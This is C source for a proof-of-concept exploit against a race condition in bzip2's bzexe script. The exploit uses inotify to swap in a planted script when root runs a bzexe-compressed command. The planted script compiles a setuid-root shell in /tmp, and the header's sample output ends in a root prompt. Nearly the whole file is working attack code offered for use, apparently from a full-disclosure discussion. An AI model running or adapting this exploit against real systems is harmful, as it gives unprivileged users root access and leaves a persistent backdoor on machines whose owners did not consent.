/* bzexec_PoC.c -- bzip2 (bzexe) race condition PoC

   Author:    vladz (http://vladz.devzero.fr)
   Tested on: Debian 6.0.3 up to date (bzip2 version 1.0.5-6)

   This PoC exploits a race condition in the bzexe script.  This tool is
   rarely used so I wasn't supposed to write an exploit.  But some people
   on the full-disclosure list had doubts about this exploitation.  Public
   discussion about this issue started from this post:  
   http://seclists.org/fulldisclosure/2011/Oct/776.

   I am using Inotify to win the race (on my dual-core, it succeed 100%).

      Usage: ./bzexe_PoC <command_name>

   For instance, if "/bin/dd" has already been compressed with bzexe,
   launch:

      $ ./bzexe_PoC dd
      [*] launching attack against "dd"
      [+] creating evil script (/tmp/evil)
      [+] creating target directory (/tmp/dd)
      [+] initialize inotify
      [+] waiting for root to launch "dd"
      [+] opening root shell
      # whoami
      root
*/
#define _GNU_SOURCE
#include <sys/inotify.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <fcntl.h>


int create_nasty_shell(char *file) {
  char *s = "#!/bin/bash\n"
            "echo 'main(){setuid(0);execve(\"/bin/sh\",0,0);}'>/tmp/sh.c\n"
            "cc /tmp/sh.c -o /tmp/sh; chown root:root /tmp/sh\n"
            "chmod 4755 /tmp/sh; rm -f ${0}; ${0##*/} $@\n";

  int fd = open(file, O_CREAT|O_RDWR, S_IRWXU|S_IRWXG|S_IRWXO);
  write(fd, s, strlen(s));
  close(fd);

  return 0;
}


int main(int argc, char **argv) {
  int fd, wd;
  char buf[1], *targetpath, 
       *evilsh = "/tmp/evil", *trash = "/tmp/trash";

  if (argc < 2) {
    printf("usage: %s <cmd name>\n", argv[0]);
    return 1;
  }

  printf("[*] launching attack against \"%s\"\n", argv[1]);

  printf("[+] creating evil script (/tmp/evil)\n");
  create_nasty_shell(evilsh);

  targetpath = malloc(sizeof(argv[1]) + 6);
  sprintf(targetpath, "/tmp/%s", argv[1]);

  printf("[+] creating target directory (%s)\n", targetpath);
  mkdir(targetpath, S_IRWXU|S_IRWXG|S_IRWXO);

  printf("[+] initialize inotify\n");
  fd = inotify_init();
  wd = inotify_add_watch(fd, targetpath, IN_CREATE);

  printf("[+] waiting for root to launch \"%s\"\n", argv[1]);
  syscall(SYS_read, fd, buf, 1);
  syscall(SYS_rename, targetpath,  trash);
  syscall(SYS_rename, evilsh, targetpath);

  inotify_rm_watch(fd, wd);

  printf("[+] opening root shell (/tmp/sh)\n");
  sleep(2);
  system("rm -fr /tmp/trash;/tmp/sh || echo \"[-] Failed.\"");

  return 0;
}
